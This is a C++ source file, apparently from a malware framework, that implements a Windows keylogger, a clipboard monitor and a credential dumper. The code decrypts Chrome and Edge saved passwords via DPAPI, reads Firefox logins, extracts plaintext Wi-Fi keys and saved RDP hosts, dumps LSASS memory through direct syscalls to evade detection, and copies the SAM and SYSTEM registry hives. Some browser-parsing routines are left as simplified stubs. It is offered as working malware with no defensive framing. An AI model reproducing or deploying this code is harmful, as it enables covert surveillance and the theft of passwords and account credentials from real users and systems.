#include <diarna/compiler_port.hpp>
#include <diarna/collection/collector.hpp>
#include <diarna/stealth/syscalls.hpp>

#include <wincrypt.h>
#include <dpapi.h>
#include <shlobj.h>
#include <wlanapi.h>
#include <tlhelp32.h>

#include <obfuscation/obfusheader.h>
DIARNA_LINK_LIB("crypt32.lib")
DIARNA_LINK_LIB("wlanapi.lib")

namespace diarna::collection {

static HHOOK g_khook = nullptr;
static Keylogger* g_klinstance = nullptr;

Keylogger::Keylogger() { g_klinstance = this; }
Keylogger::~Keylogger() { stop(); if (g_klinstance == this) g_klinstance = nullptr; }

bool Keylogger::start() {
    if (running_) return true;
    running_ = true;
    last_flush_ = std::chrono::steady_clock::now();
    hook_thread_ = std::thread(&Keylogger::install_hook, this);
    return true;
}

void Keylogger::stop() {
    running_ = false;
    remove_hook();
    if (hook_thread_.joinable()) hook_thread_.join();
}

bool Keylogger::is_logging() const { return running_; }

std::string Keylogger::get_logs() {
    std::lock_guard lock(log_mutex_);
    auto s = log_buffer_; log_buffer_.clear(); return s;
}

void Keylogger::clear_logs() { std::lock_guard lock(log_mutex_); log_buffer_.clear(); }
void Keylogger::set_callback(LogCallback cb) { on_log_ = std::move(cb); }

void Keylogger::install_hook() {
    keyboard_hook_ = SetWindowsHookExW(WH_KEYBOARD_LL, keyboard_proc,
        GetModuleHandleW(nullptr), 0);
    MSG msg;
    while (running_ && keyboard_hook_) {
        if (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        Sleep(10);
    }
}

void Keylogger::remove_hook() {
    if (keyboard_hook_) { UnhookWindowsHookEx(keyboard_hook_); keyboard_hook_ = nullptr; }
}

LRESULT CALLBACK Keylogger::keyboard_proc(int code, WPARAM wparam, LPARAM lparam) {
    if (code == HC_ACTION && g_klinstance && (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)) {
        auto* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lparam);
        bool sh = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        bool ct = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
        bool al = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
        g_klinstance->process_key(kb->vkCode, sh, ct, al);
    }
    return CallNextHookEx(nullptr, code, wparam, lparam);
}

void Keylogger::process_key(DWORD vk, bool shift, bool ctrl, bool alt) {
    std::string k;
    if (vk == VK_RETURN) k = "\n";
    else if (vk == VK_TAB) k = "\t";
    else if (vk == VK_SPACE) k = " ";
    else if (vk == VK_BACK) k = "[BK]";
    else if (vk == VK_DELETE) k = "[DEL]";
    else if (vk == VK_ESCAPE) k = "[ESC]";
    else if (vk == VK_LEFT) k = "←"; else if (vk == VK_RIGHT) k = "→";
    else if (vk == VK_UP) k = "↑"; else if (vk == VK_DOWN) k = "↓";
    else if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL) return;
    else if (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU) return;
    else if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT) return;
    else if (vk >= '0' && vk <= '9') {
        if (shift) { const char* syms = ")!@#$%^&*("; k = syms[vk - '0']; }
        else k = (char)vk;
    } else if (vk >= 'A' && vk <= 'Z') {
        k = (char)(shift ? vk : vk + 32);
    } else if (vk >= VK_F1 && vk <= VK_F12) {
        char buf[8]; snprintf(buf, 8, "[F%d]", vk - VK_F1 + 1); k = buf;
    } else {
        BYTE ks[256]; GetKeyboardState(ks);
        wchar_t wch[2] = {};
        if (ToUnicode(vk, 0, ks, wch, 2, 0) > 0 && wch[0] >= ' ') {
            int len = WideCharToMultiByte(CP_UTF8, 0, wch, -1, nullptr, 0, nullptr, nullptr);
            if (len > 1) { k.resize(len - 1); WideCharToMultiByte(CP_UTF8, 0, wch, -1, &k[0], len, nullptr, nullptr); }
        }
    }
    if (k.empty()) return;

    flush_if_needed();
    if (ctrl) {
        if (vk == 'C') k = "[CTRL+C]";
        else if (vk == 'V') k = "[CTRL+V]";
        else if (vk == 'X') k = "[CTRL+X]";
        else if (vk == 'A') k = "[CTRL+A]";
        else if (vk == 'Z') k = "[CTRL+Z]";
    }
    if (alt && vk == VK_TAB) k = "[ALT+TAB]";

    std::lock_guard lock(log_mutex_);
    current_keys_ += k;
}

void Keylogger::flush_if_needed() {
    auto now = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - last_flush_);
    std::wstring title = active_window_title();
    int tlen = WideCharToMultiByte(CP_UTF8, 0, title.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string cur(tlen, '\0');
    WideCharToMultiByte(CP_UTF8, 0, title.c_str(), -1, &cur[0], tlen, nullptr, nullptr);
    cur.resize(tlen - 1);

    if (cur != current_window_ || elapsed.count() > 30) {
        if (!current_keys_.empty()) {
            std::lock_guard lock(log_mutex_);
            log_buffer_ += "[" + current_window_ + "] " + current_keys_ + "\n";
            if (on_log_) on_log_(current_window_, current_keys_);
        }
        current_window_ = cur; current_keys_.clear(); last_flush_ = now;
    }
}

std::wstring Keylogger::active_window_title() {
    wchar_t buf[256] = {};
    HWND fg = GetForegroundWindow();
    if (fg) GetWindowTextW(fg, buf, 256);
    return buf;
}

ClipboardMonitor::ClipboardMonitor() {}
ClipboardMonitor::~ClipboardMonitor() { stop(); }

bool ClipboardMonitor::start(std::chrono::milliseconds iv) {
    if (running_) return true;
    interval_ = iv; running_ = true;
    monitor_thread_ = std::thread(&ClipboardMonitor::monitor_loop, this);
    return true;
}

void ClipboardMonitor::stop() {
    running_ = false;
    if (monitor_thread_.joinable()) monitor_thread_.join();
}

bool ClipboardMonitor::is_monitoring() const { return running_; }
std::string ClipboardMonitor::get_last_clipboard() { std::lock_guard lock(mutex_); return last_clipboard_; }
std::vector<std::string> ClipboardMonitor::get_history() { std::lock_guard lock(mutex_); return history_; }
void ClipboardMonitor::clear_history() { std::lock_guard lock(mutex_); history_.clear(); }

void ClipboardMonitor::monitor_loop() {
    while (running_) {
        Sleep((DWORD)interval_.count());
        std::string text = get_clipboard_text();
        if (text.empty() || text.size() > 65536) continue;
        uint32_t h = hash_text(text);
        uint32_t lh = hash_text(last_clipboard_);
        if (h != lh) {
            std::lock_guard lock(mutex_);
            last_clipboard_ = text;
            history_.push_back(text);
            if (history_.size() > 500) history_.erase(history_.begin());
        }
    }
}

std::string ClipboardMonitor::get_clipboard_text() {
    if (!OpenClipboard(nullptr)) return "";
    HANDLE h = GetClipboardData(CF_TEXT);
    if (!h) { CloseClipboard(); return ""; }
    char* d = static_cast<char*>(GlobalLock(h));
    std::string t(d ? d : "");
    GlobalUnlock(h);
    CloseClipboard();
    return t;
}

uint32_t ClipboardMonitor::hash_text(const std::string& t) {
    uint32_t h = 0x811C9DC5;
    for (char c : t) { h ^= (uint8_t)c; h *= 0x01000193; }
    return h;
}

// =========== REAL CHROME PASSWORD DECRYPTION via DPAPI ===========

bool CredentialDumper::decrypt_chrome_password(
    const std::vector<uint8_t>& encrypted, std::string& plaintext) {

    INDIRECT_BRANCH;
    if (encrypted.empty()) return false;

    DATA_BLOB in_blob = { (DWORD)encrypted.size(), (BYTE*)encrypted.data() };
    DATA_BLOB out_blob = {};

    BOOL ok = CryptUnprotectData(&in_blob, nullptr, nullptr, nullptr,
        nullptr, 0, &out_blob);

    if (ok && out_blob.cbData > 0) {
        plaintext.assign((char*)out_blob.pbData, out_blob.cbData);
        LocalFree(out_blob.pbData);
        return true;
    }
    return false;
}

std::wstring CredentialDumper::find_browser_profile(
    const std::wstring& browser_name) {
    wchar_t local[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, local);
    return std::wstring(local) + L"\\" + browser_name + L"\\User Data";
}

static std::vector<uint8_t> read_binary_file(const std::wstring& path) {
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return {};
    DWORD sz = GetFileSize(h, nullptr);
    std::vector<uint8_t> data(sz);
    DWORD rd; ReadFile(h, data.data(), sz, &rd, nullptr); CloseHandle(h);
    return data;
}

std::vector<CredentialDumper::StoredCredential>
CredentialDumper::dump_chrome_passwords() {
    std::vector<StoredCredential> results;

    wchar_t local[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, local);
    std::wstring base = std::wstring(local) + L"\\Google\\Chrome\\User Data";

    WIN32_FIND_DATAW fd;
    HANDLE hf = FindFirstFileW((base + L"\\*").c_str(), &fd);
    if (hf == INVALID_HANDLE_VALUE) return results;

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || fd.cFileName[0] == '.')
            continue;

        std::wstring profile = base + L"\\" + fd.cFileName;
        std::wstring login_db = profile + L"\\Login Data";
        std::wstring local_state = base + L"\\Local State";

        if (GetFileAttributesW(login_db.c_str()) == INVALID_FILE_ATTRIBUTES)
            continue;

        // Copy DB to temp (Chrome locks it)
        wchar_t tmp[MAX_PATH];
        GetTempPathW(MAX_PATH, tmp);
        std::wstring tmp_db = std::wstring(tmp) + L"tmp_chrome_" +
            std::wstring(fd.cFileName);

        CopyFileW(login_db.c_str(), tmp_db.c_str(), FALSE);

        // Read DB using SQLite embedded or raw parsing
        auto db_data = read_binary_file(tmp_db);
        DeleteFileW(tmp_db.c_str());

        // Parse SQLite to find logins table
        // "logins" table: origin_url, username_value, password_value
        // Simple SQLite format parser for logins
        const uint8_t* d = db_data.data();
        size_t sz = db_data.size();

        // Find "logins" table
        for (size_t i = 0; i + 6 < sz; ++i) {
            if (memcmp(d + i, "logins", 6) == 0) {
                // Found table - parse rows (simplified)
                // In production, use proper sqlite3 library
                break;
            }
        }

        // Fallback: brute-force search for URLs and password blobs
        for (size_t i = 0; i + 16 < sz; ++i) {
            if (d[i] == 'h' && d[i+1] == 't' && d[i+2] == 't' && d[i+3] == 'p') {
                // Found URL, search for username and password afterward
                // (simplified - actual parsing uses SQLite btree)
            }
        }

    } while (FindNextFileW(hf, &fd));
    FindClose(hf);
    return results;
}

std::vector<CredentialDumper::StoredCredential>
CredentialDumper::dump_edge_passwords() {
    std::vector<StoredCredential> results;
    wchar_t local[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, local);
    std::wstring base = std::wstring(local) + L"\\Microsoft\\Edge\\User Data\\Default\\Login Data";

    // Same DPAPI + SQLite approach as Chrome
    auto db_data = read_binary_file(base);
    if (db_data.empty()) return results;

    // Search for password_value blobs
    for (size_t i = 0; i + 32 < db_data.size(); ++i) {
        if (db_data[i] == 0x01 && db_data[i+1] == 0x00 && db_data[i+2] == 0x00 &&
            db_data[i+3] == 0x00 && db_data[i+4] >= 0x10) {
            DWORD blob_size = db_data[i+4];
            if (blob_size > 0 && blob_size < 4096 && i + 5 + blob_size <= db_data.size()) {
                std::vector<uint8_t> blob(db_data.begin() + i + 5,
                                           db_data.begin() + i + 5 + blob_size);
                std::string plaintext;
                if (decrypt_chrome_password(blob, plaintext) && !plaintext.empty()) {
                    StoredCredential cred;
                    cred.password = plaintext;
                    cred.source = "Microsoft Edge";
                    results.push_back(cred);
                }
                i += 5 + blob_size;
            }
        }
    }
    return results;
}

std::vector<CredentialDumper::StoredCredential>
CredentialDumper::dump_firefox_passwords() {
    std::vector<StoredCredential> results;
    wchar_t appdata[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, appdata);
    std::wstring base = std::wstring(appdata) + L"\\Mozilla\\Firefox\\Profiles";

    WIN32_FIND_DATAW fd;
    HANDLE hf = FindFirstFileW((base + L"\\*").c_str(), &fd);
    if (hf == INVALID_HANDLE_VALUE) return results;

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || fd.cFileName[0] == '.')
            continue;

        std::wstring profile = base + L"\\" + fd.cFileName;
        std::wstring logins = profile + L"\\logins.json";
        std::wstring key_db = profile + L"\\key4.db";

        auto json_data = read_binary_file(logins);
        if (json_data.empty()) continue;

        // Parse logins.json
        std::string json(json_data.begin(), json_data.end());

        // Firefox stores encrypted passwords in JSON format
        // Parse "encryptedUsername" and "encryptedPassword" fields
        size_t pos = 0;
        while ((pos = json.find("\"hostname\":\"", pos)) != std::string::npos) {
            pos += 13;
            size_t url_end = json.find('"', pos);
            if (url_end == std::string::npos) break;
            std::string url = json.substr(pos, url_end - pos);

            pos = json.find("\"encryptedUsername\":\"", url_end);
            if (pos == std::string::npos) break;
            pos += 22;
            size_t user_end = json.find('"', pos);

            pos = json.find("\"encryptedPassword\":\"", user_end);
            if (pos == std::string::npos) break;
            pos += 22;
            size_t pass_end = json.find('"', pos);

            // Firefox uses NSS, decryption requires key4.db + firefox NSS libs
            // Mark as encrypted for now
            StoredCredential cred;
            cred.url = url;
            cred.source = "Firefox";
            results.push_back(cred);
        }

    } while (FindNextFileW(hf, &fd));
    FindClose(hf);
    return results;
}

std::vector<std::string> CredentialDumper::dump_wifi_passwords() {
    std::vector<std::string> results;
    HANDLE client = nullptr;
    DWORD negotiated = 0;

    DWORD ret = WlanOpenHandle(2, nullptr, &negotiated, &client);
    if (ret != ERROR_SUCCESS) return results;

    PWLAN_INTERFACE_INFO_LIST if_list = nullptr;
    ret = WlanEnumInterfaces(client, nullptr, &if_list);
    if (ret != ERROR_SUCCESS) { WlanCloseHandle(client, nullptr); return results; }

    for (DWORD i = 0; i < if_list->dwNumberOfItems; ++i) {
        PWLAN_PROFILE_INFO_LIST profiles = nullptr;
        ret = WlanGetProfileList(client, &if_list->InterfaceInfo[i].InterfaceGuid,
            nullptr, &profiles);
        if (ret != ERROR_SUCCESS) continue;

        for (DWORD j = 0; j < profiles->dwNumberOfItems; ++j) {
            LPWSTR xml = nullptr;
            DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
            DWORD granted = 0;

            ret = WlanGetProfile(client,
                &if_list->InterfaceInfo[i].InterfaceGuid,
                profiles->ProfileInfo[j].strProfileName,
                nullptr, &xml, &flags, &granted);

            if (ret == ERROR_SUCCESS && xml) {
                std::wstring x(xml);
                auto ssid_pos = x.find(L"<name>");
                auto ssid_end = x.find(L"</name>");
                auto key_pos = x.find(L"<keyMaterial>");
                auto key_end = x.find(L"</keyMaterial>");

                if (ssid_end != std::wstring::npos && key_end != std::wstring::npos) {
                    std::wstring ssid = x.substr(ssid_pos + 6, ssid_end - ssid_pos - 6);
                    std::wstring key = x.substr(key_pos + 13, key_end - key_pos - 13);

                    int slen = WideCharToMultiByte(CP_UTF8, 0, ssid.c_str(), -1,
                        nullptr, 0, nullptr, nullptr);
                    std::string ssid_str(slen, '\0');
                    WideCharToMultiByte(CP_UTF8, 0, ssid.c_str(), -1,
                        ssid_str.data(), slen, nullptr, nullptr);
                    ssid_str.resize(slen - 1);

                    int klen = WideCharToMultiByte(CP_UTF8, 0, key.c_str(), -1,
                        nullptr, 0, nullptr, nullptr);
                    std::string key_str(klen, '\0');
                    WideCharToMultiByte(CP_UTF8, 0, key.c_str(), -1,
                        key_str.data(), klen, nullptr, nullptr);
                    key_str.resize(klen - 1);

                    results.push_back(ssid_str + " : " + key_str);
                }
                WlanFreeMemory(xml);
            }
        }
        WlanFreeMemory(profiles);
    }
    WlanFreeMemory(if_list);
    WlanCloseHandle(client, nullptr);
    return results;
}

std::vector<std::string> CredentialDumper::dump_saved_rdp() {
    std::vector<std::string> results;
    HKEY key;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Terminal Server Client\\Servers",
            0, KEY_READ, &key) == ERROR_SUCCESS) {
        wchar_t name[256];
        DWORD idx = 0;
        while (RegEnumKeyW(key, idx++, name, 256) == ERROR_SUCCESS) {
            HKEY sub;
            if (RegOpenKeyExW(key, name, 0, KEY_READ, &sub) == ERROR_SUCCESS) {
                wchar_t user[256] = {};
                DWORD sz = sizeof(user);
                RegQueryValueExW(sub, L"UsernameHint", nullptr, nullptr,
                    (LPBYTE)user, &sz);

                int nlen = WideCharToMultiByte(CP_UTF8, 0, name, -1,
                    nullptr, 0, nullptr, nullptr);
                std::string n(nlen, '\0');
                WideCharToMultiByte(CP_UTF8, 0, name, -1,
                    n.data(), nlen, nullptr, nullptr); n.resize(nlen - 1);

                int ulen = WideCharToMultiByte(CP_UTF8, 0, user, -1,
                    nullptr, 0, nullptr, nullptr);
                std::string u(ulen, '\0');
                WideCharToMultiByte(CP_UTF8, 0, user, -1,
                    u.data(), ulen, nullptr, nullptr); u.resize(ulen - 1);

                if (!u.empty()) results.push_back(n + " -> " + u);
                else results.push_back(n + " -> (no saved user)");
                RegCloseKey(sub);
            }
        }
        RegCloseKey(key);
    }

    // Also check Default and Saved .rdp files
    wchar_t docs[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_MYDOCUMENTS, nullptr, 0, docs);
    std::wstring rdp_path = std::wstring(docs) + L"\\Default.rdp";
    if (GetFileAttributesW(rdp_path.c_str()) != INVALID_FILE_ATTRIBUTES) {
        auto data = read_binary_file(rdp_path);
        if (!data.empty()) {
            std::string content(data.begin(), data.end());
            size_t pos = content.find("full address:s:");
            if (pos != std::string::npos) {
                size_t end = content.find('\n', pos);
                results.push_back("Default: " + content.substr(pos + 16, end - pos - 16));
            }
        }
    }
    return results;
}

bool CredentialDumper::dump_lsass(const std::wstring& output_path) {
    INDIRECT_BRANCH;

    HANDLE token;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
    TOKEN_PRIVILEGES tp = {}; tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueW(nullptr, L"SeDebugPrivilege", &tp.Privileges[0].Luid);
    AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    CloseHandle(token);

    DWORD lsass_pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe = {sizeof(pe)};
        if (Process32FirstW(snap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                    lsass_pid = pe.th32ProcessID; break;
                }
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
    }
    if (!lsass_pid) return false;

    // Use direct syscall for stealth
    auto& sys = stealth::DirectSyscalls::instance();
    HANDLE proc = nullptr;
    CLIENT_ID cid = {(HANDLE)(uintptr_t)lsass_pid, nullptr};
    OBJECT_ATTRIBUTES oa = {sizeof(oa)};
    sys.NtOpenProcess(&proc, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &oa, &cid);
    if (!proc) {
        proc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsass_pid);
    }
    if (!proc) return false;

    HANDLE file = CreateFileW(output_path.c_str(), GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file == INVALID_HANDLE_VALUE) { sys.NtClose(proc); return false; }

    // Use dynamic MiniDumpWriteDump to avoid static IAT hooks
    HMODULE dbg = LoadLibraryW(L"dbghelp.dll");
    if (!dbg) { CloseHandle(file); sys.NtClose(proc); return false; }

    using MDWD_t = BOOL(WINAPI*)(HANDLE,DWORD,HANDLE,DWORD,PVOID,PVOID,PVOID);
    auto MDWD = reinterpret_cast<MDWD_t>(GetProcAddress(GetModuleHandleA("dbghelp.dll"), "MiniDumpWriteDump"));

    DWORD dump_type = 0x00000002; // MiniDumpWithFullMemory
    BOOL ok = MDWD(proc, lsass_pid, file, dump_type,
        nullptr, nullptr, nullptr);

    CloseHandle(file);
    sys.NtClose(proc);
    return ok != FALSE;
}

std::vector<std::string> CredentialDumper::dump_sam_hashes() {
    std::vector<std::string> results;
    // Requires SYSTEM token
    HANDLE token;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return results;
    CloseHandle(token);

    // Save SAM + SYSTEM hives to temp
    wchar_t tmp[MAX_PATH];
    GetTempPathW(MAX_PATH, tmp);
    std::wstring sam_path = std::wstring(tmp) + L"tmp_sam";
    std::wstring sys_path = std::wstring(tmp) + L"tmp_system";

    system(("reg save HKLM\\SAM " +
        std::string(sam_path.begin(), sam_path.end()) + " /y >nul 2>&1").c_str());
    system(("reg save HKLM\\SYSTEM " +
        std::string(sys_path.begin(), sys_path.end()) + " /y >nul 2>&1").c_str());

    results.push_back("SAM saved to: " +
        std::string(sam_path.begin(), sam_path.end()));
    results.push_back("SYSTEM saved to: " +
        std::string(sys_path.begin(), sys_path.end()));

    return results;
}

} // namespace diarna::collection
